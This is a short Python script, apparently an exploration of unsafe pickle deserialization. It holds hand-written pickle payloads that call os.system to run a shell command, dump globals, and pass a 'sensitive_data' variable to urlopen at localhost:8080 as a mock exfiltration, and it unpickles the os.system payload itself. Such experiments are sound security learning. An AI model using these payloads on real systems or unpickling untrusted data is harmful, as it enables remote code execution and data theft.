import pickle
from types import MethodType  # https://stackoverflow.com/questions/1647586/is-it-possible-to-change-an-instances-method-implementation-without-changing-al

class C: 
    a = 1

def test():
    global C
    class C(C):
        @property
        def a(self): return "hack"
    return C()

print(C.a)
print(pickle.loads(pickle.dumps(test())).a)
    

sensitive_data = "my heart"

scary_pickle_string_1 = b"""c__builtin__
print
(S'hello world'
tR.
"""

scary_pickle_string_11 = b"""cos
system
(S'echo \"hello\"'
tR.
"""

scary_pickle_string_2a = b"""c__builtin__
globals
(tR.
"""

scary_pickle_string_2b = b"""c__builtin__
globals
(tR.
"""

scary_pickle_string_3 = b"""curllib.request
urlopen
(S"localhost:8080"
c__builtin__
globals
(tR
(sensitive_data
tR
tR.
"""



print(pickle.loads(
    scary_pickle_string_11
))